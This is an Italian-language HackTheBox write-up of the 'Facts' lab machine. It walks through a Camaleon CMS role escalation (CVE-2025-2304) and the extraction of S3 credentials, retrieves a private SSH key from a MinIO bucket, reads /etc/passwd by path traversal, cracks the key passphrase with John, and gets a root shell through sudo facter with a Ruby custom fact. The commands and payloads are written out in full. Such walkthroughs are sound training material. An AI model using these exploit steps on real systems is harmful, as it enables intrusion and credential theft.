# Facts — HackTheBox Writeup

> **Difficoltà:** Facile  
> **OS:** Linux (Ubuntu 25.04)  
> **Categoria:** Web, Privilege Escalation  
> **CVE Coinvolte:** CVE-2025-2304, CVE-2024-46987

---

## 📋 Panoramica

La macchina **Facts** ospita un'installazione di **Camaleon CMS 2.9.0** affetta da due vulnerabilità critiche:
- **CVE-2025-2304** — Authenticated Privilege Escalation via Mass Assignment
- **CVE-2024-46987** — Arbitrary Path Traversal per la lettura di file arbitrari

L'accesso iniziale viene ottenuto estraendo le credenziali AWS dal CMS e utilizzandole per accedere a un bucket **MinIO** contenente una chiave SSH privata. Il cracking della passphrase della chiave permette il login SSH come utente non privilegiato. L'escalation dei privilegi a root viene eseguita sfruttando il binario `facter`, che può essere eseguito tramite `sudo` senza password.

---

## 🔍 Fase 1 — Enumerazione

### Port Scan

Durante la fase di enumerazione, vengono identificate due porte rilevanti:

| Porta | Servizio | Note |
|------|---------|-------|
| 80/tcp | HTTP (Camaleon CMS) | Pannello di amministrazione |
| 54321/tcp | HTTP (MinIO / S3-compatible) | Storage di oggetti interno |

La porta `54321` restituisce header significativi:

```
Content-Type: application/xml
<Error><Code>InvalidRequest</Code>...
X-Amz-Request-Id
X-Amz-Id-2
```

> I prefissi `Amz` e la risposta XML in stile S3 confermano che si tratta di un servizio **MinIO** — un server di storage di oggetti compatibile con Amazon S3. Il reindirizzamento a `http://facts.htb:9001` rivela inoltre una console web MinIO separata.

**Architettura identificata:**
```
[ Camaleon CMS :80 ] ──→ [ MinIO Storage :54321 ]
                                    ↕
                         [ MinIO Console :9001 ]
```

---

## 🌐 Fase 2 — Accesso Iniziale al CMS

### Registrazione e Login

L'endpoint `/admin` espone un pannello di login che **consente anche la registrazione aperta**. Viene creato un account utente standard:
<p align="center">
  <img src="https://raw.githubusercontent.com/Elm4lek/Writeups/main/img/image-3.png" width="500">
</p>
- **Username:** `bob`  
- **Password:** `bob`

Dopo il login, è possibile accedere al pannello di amministrazione di **Camaleon CMS versione 2.9.0**.
<p align="center">
  <img src="https://raw.githubusercontent.com/Elm4lek/Writeups/main/img/image-4.png" width="500">
</p>

---

## ⚠️ Fase 3 — CVE-2025-2304: Privilege Escalation (Mass Assignment)

### Dettagli Vulnerabilità

| Campo | Dettaglio |
|-------|-----------|
| **CVE** | CVE-2025-2304 |
| **Tipo** | Mass Assignment / Privilege Escalation |
| **Autenticazione** | Richiesta (utente standard) |
| **CVSS v3.0** | 8.8 (Alto) |
| **CVSS v4.0** | 9.4 (Critico) |

**Root Cause:** Il metodo `updated_ajax` nel controller `UsersController` utilizza `permit!` senza alcun filtraggio dei parametri. Ciò consente a un attaccante di inviare campi arbitrari — come `role` — durante una richiesta di cambio password, modificando il proprio ruolo utente senza autorizzazione.

**Impatto:** Un utente con il ruolo `client` può passare a `admin` con una singola richiesta HTTP manipolata.

### Sfruttamento

Viene utilizzato l'exploit pubblico disponibile su GitHub:  
🔗 [CVE-2025-2304 exploit.py](https://github.com/Alien0ne/CVE-2025-2304/blob/main/exploit.py)

**Step 1 — Scalata del ruolo a `admin`:**

```sh
└─$ python exploit.py -u http://facts.htb -U bob -P bob --newpass bob123

[+] Camaleon CMS Version 2.9.0 PRIVILEGE ESCALATION (Authenticated)
[+] Login confirmed
   User ID: 5
   Current User Role: client
[+] Loading PRIVILEGE ESCALATION
   User ID: 5
   Updated User Role: admin
[+] Reverting User Role
```

**Step 2 — Estrazione delle credenziali S3/MinIO:**

L'exploit include il flag `-e` per estrarre le credenziali AWS memorizzate nelle impostazioni del CMS:

```sh
└─$ python exploit.py -u http://facts.htb -U bob -P bob123 -e

[+] Camaleon CMS Version 2.9.0 PRIVILEGE ESCALATION (Authenticated)
[+] Login confirmed
   User ID: 5
   Current User Role: admin
[+] Extracting S3 Credentials
   s3 access key: AKIA7D2CD003BA5877FA
   s3 secret key: BlrFaANgPifpFKoDgKYdjuRb8s0MKI0IrDlDq7Y2
   s3 endpoint: http://localhost:54321
[+] Reverting User Role
```

> 💡 Le stesse credenziali possono essere trovate anche manualmente nelle **Impostazioni del CMS** (sezione impostazioni filesystem nelle impostazioni generali http://facts.htb/admin/settings/site), senza l'uso dell'exploit.

---

## 🪣 Fase 4 — Accesso a MinIO e Recupero della Chiave SSH

### Configurazione AWS CLI

Le credenziali estratte vengono configurate nell'AWS CLI per interagire con il server MinIO:

```sh
aws configure
# AWS Access Key ID:     AKIA7D2CD003BA5877FA
# AWS Secret Access Key: BlrFaANgPifpFKoDgKYdjuRb8s0MKI0IrDlDq7Y2
# Default region name:   us-east-1
# Default output format: (lasciare vuoto)
```

### Elenco dei Bucket

```sh
└─$ aws --endpoint-url http://facts.htb:54321 s3 ls

2025-09-11 08:06:52 internal
2025-09-11 08:06:52 randomfacts
```

Trovati due bucket: `internal` (interessante) e `randomfacts` (immagini pubbliche del sito).

### Esplorazione del Bucket `internal`

```sh
└─$ aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal

PRE .bundle/
PRE .cache/
PRE .ssh/
    .bash_logout
    .bashrc
    .lesshst
    .profile
```

> ⚠️ Il bucket `internal` sembra essere la **home directory di un utente esposta come bucket S3**. La cartella `.ssh/` è particolarmente interessante.

### Download della Chiave SSH Privata

```sh
└─$ aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal/.ssh/

2026-04-30 05:46:19    82  authorized_keys
2026-04-30 05:46:19   464  id_ed25519
```

```sh
# Scarica la chiave privata
aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 .

# Imposta i permessi corretti (richiesto per SSH)
chmod 600 id_ed25519
```

---

## 👤 Fase 5 — Enumerazione Utenti via CVE-2024-46987

### Dettagli Vulnerabilità

| Campo | Dettaglio |
|-------|-----------|
| **CVE** | CVE-2024-46987 |
| **Tipo** | Arbitrary Path Traversal (autenticato) |
| **Endpoint** | `/admin/media/download_private_file` |

Il parametro `file` non è validato, consentendo l'attraversamento del filesystem tramite sequenze `../`.

### Lettura di `/etc/passwd`

```
http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/passwd
```

```sh
└─$ cat passwd | grep /bin/bash

root:x:0:0:root:/root:/bin/bash
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
```

**Utenti identificati:** `root`, `trivia`, `william`

---

## 🔐 Fase 6 — Accesso SSH e Cracking della Passphrase

### Tentativo SSH Iniziale

La chiave `id_ed25519` trovata nel bucket `internal` appartiene all'utente `trivia` (la cui home directory era esposta come bucket). Tuttavia, la chiave è protetta da passphrase:

```sh
└─$ ssh -i id_ed25519 trivia@facts.htb
Enter passphrase for key 'id_ed25519':
```

### Cracking con John the Ripper

**Step 1 — Convertire la chiave in un formato hash crackabile:**
```sh
ssh2john id_ed25519 > hash.txt
```

**Step 2 — Attacco a dizionario con rockyou:**
```sh
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher) is 2 (Bcrypt/AES) for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 6 OpenMP threads

dragonballz      (id_ed25519)
1g 0:00:01:50 DONE  0.009026g/s  29.03p/s
Session completed.
```

> ✅ **Passphrase trovata:** `dragonballz`

### Login SSH Successivo

```sh
└─$ ssh -i id_ed25519 trivia@facts.htb
Enter passphrase for key 'id_ed25519': dragonballz

Welcome to Ubuntu 25.04 (GNU/Linux 6.14.0-37-generic x86_64)
...
trivia@facts:~$
```

---

## 🚩 User Flag

```sh
trivia@facts:/home$ cd william/
trivia@facts:/home/william$ cat user.txt

cd8d5***************************
```

> **Alternativa via Path Traversal (nessun SSH richiesto):**  
> `http://facts.htb/admin/media/download_private_file?file=../../../../../../home/william/user.txt`

<p align="center">
  <img src="https://raw.githubusercontent.com/Elm4lek/Writeups/main/img/image-1.png" width="500">
</p>

---

## 🔺 Fase 7 — Privilege Escalation a Root (Abuso di Facter)

### Enumerazione Locale

```sh
trivia@facts:/home$ id
uid=1000(trivia) gid=1000(trivia) groups=1000(trivia)

trivia@facts:/home$ sudo -l
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin,
    use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

> L'utente `trivia` può eseguire `/usr/bin/facter` come `root` **senza password**.

### Cos'è Facter?

`facter` è uno strumento di raccolta informazioni di sistema basato su Ruby, utilizzato da Puppet. Supporta **custom facts** — script Ruby caricati da directory specificate dall'utente tramite `--custom-dir`. Poiché il processo viene eseguito come root, qualsiasi codice all'interno di questi script viene eseguito con privilegi di root.

```sh
trivia@facts:/usr/bin$ cat facter
#!/usr/bin/ruby
# frozen_string_literal: true

require 'pathname'
require 'facter/framework/cli/cli_launcher'

Facter::OptionsValidator.validate(ARGV)
processed_arguments = CliLauncher.prepare_arguments(ARGV)
CliLauncher.start(processed_arguments)
```

<p align="center">
  <img src="https://raw.githubusercontent.com/Elm4lek/Writeups/main/img/image-2.png" width="500">
</p>

### Exploit — RCE Ruby tramite Custom Fact

Il flag `--custom-dir` consente di specificare una directory da cui caricare script Ruby arbitrari. Poiché `facter` è eseguito come `root`, qualsiasi codice in tali script viene eseguito con privilegi di root.

```sh
# Step 1: crea uno script Ruby malevolo in /tmp
trivia@facts:/usr/bin$ echo 'exec "/bin/bash"' > /tmp/x.rb

# Step 2: esegui facter con sudo, puntando a /tmp come custom-dir
trivia@facts:/usr/bin$ sudo facter --custom-dir=/tmp x
```

```sh
root@facts:/usr/bin#
```

> ✅ **Shell root ottenuta!**

---

## 🚩 Root Flag

```sh
root@facts:/usr/bin# cd /root/
root@facts:~# ls
minio-binaries  ministack  root.txt  snap

root@facts:~# cat root.txt
cfcf8***************************
```

---

## 📊 Riepilogo dell'Attacco

```
[Registrazione account sul CMS]
        ↓
[CVE-2025-2304: Scalata del ruolo CMS ad admin]
        ↓
[Estrazione credenziali AWS/MinIO dalle impostazioni del CMS]
        ↓
[Accesso al bucket MinIO → recupero chiave SSH privata id_ed25519]
        ↓
[CVE-2024-46987: Path Traversal → /etc/passwd → identificazione utenti]
        ↓
[John the Ripper → cracking passphrase SSH: dragonballz]
        ↓
[Login SSH come trivia → User Flag]
        ↓
[sudo facter --custom-dir=/tmp → RCE come root]
        ↓
[Root Flag]
```

---

## 🛠️ Tool Utilizzati

| Tool                         | Scopo                                             |
| ---------------------------- | ------------------------------------------------- |
| `nmap`                       | Enumerazione porte e servizi                      |
| `exploit.py` (CVE-2025-2304) | Privilege escalation CMS + estrazione credenziali  |
| `aws cli`                    | Interazione MinIO (S3-compatible)                 |
| `ssh2john`                   | Conversione chiave SSH in hash crackabile         |
| `john`                       | Cracking della passphrase SSH                     |
| `facter`                     | Privilege escalation a root                       |

---
## 📚 Lezioni Apprese  
  
- I backend di storage mal configurati possono esporre dati critici  
- Le vulnerabilità web spesso portano alla compromissione completa del sistema  
- I tool Ruby in sudo sono vettori comuni per la privilege escalation
